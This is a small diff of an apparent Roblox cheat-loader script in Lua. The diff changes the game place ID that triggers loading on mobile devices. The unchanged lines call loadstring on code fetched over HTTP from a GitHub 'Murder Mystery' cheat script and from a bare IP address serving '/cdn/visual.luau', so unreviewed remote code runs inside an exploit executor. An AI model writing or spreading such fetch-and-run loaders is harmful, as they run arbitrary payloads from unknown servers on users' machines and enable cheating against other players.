@@ -12,7 +12,7 @@ local Touchscreen = UIS.TouchEnabled
 getgenv().checker = Touchscreen and "Mobile" or "PC"
 
 if getgenv().checker == "Mobile" then
-    if game.PlaceId == 14282329 then
+    if game.PlaceId == 142823291 then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/MateoDev/refs/heads/main/Murder%20Mystery"))()
         loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
     else
